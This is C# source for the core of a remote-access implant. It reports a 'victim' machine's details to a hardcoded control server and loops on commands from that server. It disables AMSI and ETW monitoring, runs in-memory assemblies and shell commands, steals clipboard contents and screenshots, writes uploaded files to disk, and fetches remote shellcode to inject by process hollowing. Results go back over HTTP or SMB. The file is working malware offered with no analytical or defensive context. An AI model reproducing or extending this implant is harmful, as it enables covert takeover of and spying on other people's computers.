using System;
using System.Net;
using System.Text;
using HTTPImplant.Modules;
using System.IO;
using SMBImplant.Modules;

namespace HTTPImplant
{
    public class Command
    {

        public string Input { get; set; }
        public string command { get; set; }
        public string Args { get; set; }
        public string ImplantUser { get; set; }
        public string Operator { get; set; }
        public string TimeToExec { get; set; }
        public string Delay { get; set; }
        public string File { get; set; }
        public string usesmb { get; set; }
        public string actsmb { get; set; }
    }

    public class Victim
    {
        public string ID { get; set; }  
        public string DeviceName { get; set; }
        public string Username { get; set; }
        public int OperatorID { get; set; }
        public string Network { get; set; }
        public string OperatingSystem { get; set; }
        public string CPU { get; set; }
        public string GPU { get; set; }
        public int RAM { get; set; }
        public string Storage { get; set; }
        public string CurrentDate { get; set; }
    }
    // This Implant class acts as the entry point of the implant program.
    public class Implant
    {

        public static Victim victim = new Victim();
        public static string host = "192.168.10.33";  // Host of the implant server
        public static string port = "8081"; // Port of the implant server
        public static string lastCommandExecuted = string.Empty; // Store the last command that was executed
        public static bool SMB = false;
        public static bool actsmb;
        public static string computername = string.Empty;
        public static string token = string.Empty;

        public static void Main(string[] args)
        {

            string implantId = Environment.MachineName;

            string victim_information = GenerateJson();

            token = RegisterImplant(victim_information);
            var victim = new Victim();

            victim = GetVictim(victim);

            AmsiHBP.Start();

            EtwPatch.Start();

            using (WebClient webClient = new WebClient())
            {
                string jsonResponse = "";
                string lastCommandExecuted = "";
                while (true)
                {
                    try
                    {
                        Command command = new Command();

                        if (!SMB)
                        {
                            string url = "http://" + host + ":" + port + "/getCommand?token="+token+"&user=" + victim.Username;
                            //Console.WriteLine("Getting instructions from: " + url);

                            jsonResponse = webClient.DownloadString(new Uri(url));

                            command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                            command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
                            command.Args = jsonResponse.Split(new string[] { "\"Args\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                            command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                            command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                            command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                            command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                            command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"usesmb" }, StringSplitOptions.None)[1];
                            command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\",\"actsmb" }, StringSplitOptions.None)[1];
                            command.actsmb = jsonResponse.Split(new string[] { "\"actsmb\":\"", "\"}" }, StringSplitOptions.None)[1];

                            //SMBServer.StoreCommand(command);
                        }

                        else
                        {
                            jsonResponse = SMBClient.ReadCommandFromSMB(computername);
                            if (string.IsNullOrEmpty(jsonResponse))
                            {
                                continue; // Skip this iteration if no command is received
                            }
                        }
                        /*Console.WriteLine("User for issued command: " + command.ImplantUser);
                        Console.WriteLine("Current implant user: " + victim.Username);*/

                        if (command.ImplantUser == victim.Username)
                        {
                            try
                            {
                                string inputCommand = command.Input.Trim().ToLower();

                                switch (inputCommand)
                                {
                                    case "execute-assembly":
                                        Console.WriteLine("Running assembly");
                                        byte[] bytes = Convert.FromBase64String(command.File);
                                        string outputAssembly = ExecuteAssembly.Execute(bytes);
                                        string outputBase64Assembly = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputAssembly));
                                        Console.WriteLine(outputAssembly);
                                        if (SMB)
                                        {
                                            SMBClient.SendData(outputBase64Assembly, computername); // Replace with your SMB sending method
                                        }
                                        else
                                        {
                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64Assembly);
                                        }
                                        break;

                                    case "os":
                                        //Console.WriteLine("Running command: " + command.Input);
                                        string outputOS = Commands.command(command.command, command.Args);
                                        string outputBase64OS = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputOS));
                                        if (SMB)
                                        {
                                            SMBClient.SendData(outputBase64OS, computername);
                                        }
                                        else
                                        {
                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64OS);
                                        }
                                        break;

                                    case "powerless":
                                        string outputPL = Commands.command(command.command, command.Args);
                                        string outputBase64PL = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputPL));
                                        if (SMB)
                                        {
                                            SMBClient.SendData(outputBase64PL, computername);
                                        }
                                        else
                                        {
                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64PL);
                                        }
                                        break;

                                    case "enable_smb_client":
                                        SMB = true;
                                        computername = command.Args;
                                        Console.WriteLine("Enabling SMB Client with computer: " + computername);
                                        break;

                                    case "enable_smb_server":
                                        Console.WriteLine("Starting SMB Server");
                                        SMBServer.StartServer(host, port, command.ImplantUser, command.Operator);
                                        break;

                                    case "clip":
                                        //Console.WriteLine("Running clipboard fetcher... ");
                                        string outputClip = ClipboardFetcher.GetData();
                                        string outputBase64Clip = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputClip));
                                        if (SMB)
                                        {
                                            SMBClient.SendData(outputBase64Clip, computername);
                                        }
                                        else
                                        {
                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64Clip);
                                        }
                                        break;

                                    case "screengrab":
                                        //Console.WriteLine("Running screen fetcher... ");
                                        string outputScreen = ScreenGrab.CaptureScreen();
                                        HTTP.SendResult(host, port, implantId, command.Operator, outputScreen);
                                        break;

                                    case "cd":
                                        //Console.WriteLine("Changing the current directory");
                                        string path = command.Args;
                                        string outputCD = Commands.SetCurrentDir(path);
                                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputCD));
                                        if (SMB)
                                        {
                                            SMBClient.SendData(outputBase64, computername);
                                        }
                                        else
                                        {
                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64);
                                        }
                                        break;

                                    case "upload":
                                        Console.WriteLine("Received: " + command.Input);
                                        Console.WriteLine("Uploading: " + command.Args);

                                        byte[] file = Convert.FromBase64String(command.File);

                                        File.WriteAllBytes(command.Args, file);

                                        Console.WriteLine("File saved to: " + command.command);

                                        break;

                                    case "loadcs":
                                        Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
                                        try
                                        {
                                            string encodedSourceCode = command.File;

                                            Console.WriteLine("Encoded Source Code: \n" + encodedSourceCode);

                                            byte[] code = Convert.FromBase64String(encodedSourceCode);
                                            string decodedSourceCode = Encoding.UTF8.GetString(code);

                                            Console.WriteLine("Decoded Source Code: \n" + decodedSourceCode);

                                            CompileAndRunNET.ExecuteCS(decodedSourceCode);
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine("Exception caught: " + ex.ToString());
                                        }
                                        break;

                                    case "load_shellcode":
                                        Console.WriteLine("Loading custom shellcode");
                                        string url = command.File;
                                        byte[] shellcode = CodeFetch.FetchCode(url);
                                        ShellcodeLoader.ProcHollow(shellcode);
                                        break;

                                    default:
                                        Console.WriteLine("Unknown command: " + inputCommand);
                                        break;
                                    }
                                    lastCommandExecuted = command.Input;
                            }
                            catch (Exception)
                            {
                                //Console.WriteLine(ex.Message);
                            }
                        }
                    }
                    catch (Exception)
                    {
                        System.Threading.Thread.Sleep(5000);
                        //Console.WriteLine(e.Message);
                    }
                }
            }
        }

        public static string GenerateJson()
        {
            string id = GetImplantInfo.GenerateRandomString(6); // Assuming this is a random string
            string deviceName = GetImplantInfo.GetComputerName();
            string username = GetImplantInfo.Username();
            string operatingSystem = GetImplantInfo.OperatingSystem();
            int ram = GetImplantInfo.RAM(); // Assuming RAM() returns something like "16 GB"
            string cpu = GetImplantInfo.CPU();
            string gpu = GetImplantInfo.GPU();
            string storage = GetImplantInfo.Storage();
            string network = GetImplantInfo.Network().Replace("\n", "\\n").Replace("\r", "\\r").Replace("\"", "\\\"");
            string currentDate = GetImplantInfo.GetCurrentDate();
            int operatorId = 1;

            string json = "{\n" +
                "\t\"ID\": \"" + id + "\",\n" +
                "\t\"DeviceName\": \"" + deviceName + "\",\n" +
                "\t\"Username\": \"" + username + "\",\n" +
                "\t\"OperatorID\": " + operatorId + ",\n" +
                "\t\"CPUArchitecture\": \"" + cpu + "\",\n" +
                "\t\"GPUInfo\": \"" + gpu + "\",\n" +
                "\t\"RAMInfo\": " + ram + ",\n" +
                "\t\"OSName\": \"" + operatingSystem + "\",\n" +
                "\t\"NetworkInfo\": \"" + network + "\",\n" +
                "\t\"CurrentDate\": \"" + currentDate + "\"\n" +
            "}";

            return json;
        }

        public static Victim GetVictim(Victim victim)
        {
            string id = GetImplantInfo.GenerateRandomString(6); // Assuming this is a random string
            string deviceName = GetImplantInfo.GetComputerName();
            string username = GetImplantInfo.Username();
            string operatingSystem = GetImplantInfo.OperatingSystem();
            int ram = GetImplantInfo.RAM(); // Assuming RAM() returns something like "16 GB"
            string cpu = GetImplantInfo.CPU();
            string gpu = GetImplantInfo.GPU();
            string storage = GetImplantInfo.Storage();
            string network = GetImplantInfo.Network().Replace("\n", "\\n").Replace("\r", "\\r").Replace("\"", "\\\"");
            string currentDate = GetImplantInfo.GetCurrentDate();
            int operatorId = 1;

            victim.ID = id;
            victim.Username = username;
            victim.DeviceName = deviceName;
            victim.OperatingSystem = operatingSystem;
            victim.CPU = cpu;
            victim.GPU = gpu;
            victim.Storage = storage;
            victim.Network = network;
            victim.CurrentDate = currentDate;
            victim.RAM = ram;
            victim.OperatorID = operatorId;

            return victim;
        }


        public static string RegisterImplant(string victim_json)
        {
            string response = "";
            using (var webClient = new WebClient())
            {
                webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
                try
                {
                    response = webClient.UploadString(new Uri("http://" + host + ":" + port + "/registerNewImplant"), "POST", victim_json);

                    // Check if the response contains "token: "
                    if (response.StartsWith("token: "))
                    {
                        // Extract the token part
                        return response.Substring("token: ".Length).Trim();
                    }
                }
                catch (WebException)
                {
                    // Handle the exception according to your needs
                    //Console.WriteLine("Error: " + ex.Message);
                }

                // Return the full response or handle accordingly if the expected token format is not found
                return response;
            }
        }

    }
}
